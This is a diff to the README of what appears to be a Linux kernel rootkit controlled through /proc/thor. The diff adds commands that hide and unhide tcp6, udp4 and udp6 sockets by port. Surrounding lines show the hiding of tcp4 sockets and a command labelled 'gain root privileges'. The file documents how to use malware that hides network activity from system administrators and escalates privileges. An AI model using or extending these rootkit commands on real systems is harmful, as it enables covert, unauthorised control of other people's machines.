@@ -37,6 +37,15 @@ target kernel. Or you could simply change the `Makefile`.
        echo ht4s PORT > /proc/thor     (hide tcp4 socket)
        echo ut4s PORT > /proc/thor     (unhide tcp4 socket)
        echo ut4a      > /proc/thor     (unhide all tcp4 sockets)
+       echo ht6s PORT > /proc/thor     (hide tcp6 socket)
+       echo ut6s PORT > /proc/thor     (unhide tcp6 socket)
+       echo ut6a      > /proc/thor     (unhide all tcp6 sockets)
+       echo hu4s PORT > /proc/thor     (hide udp4 socket)
+       echo uu4s PORT > /proc/thor     (unhide udp4 socket)
+       echo uu4a      > /proc/thor     (unhide all udp4 sockets)
+       echo hu6s PORT > /proc/thor     (hide udp6 socket)
+       echo uu6s PORT > /proc/thor     (unhide udp6 socket)
+       echo uu6a      > /proc/thor     (unhide all udp6 sockets)
        echo root      > /proc/thor     (gain root privileges)
 
 ## Acknowledgement
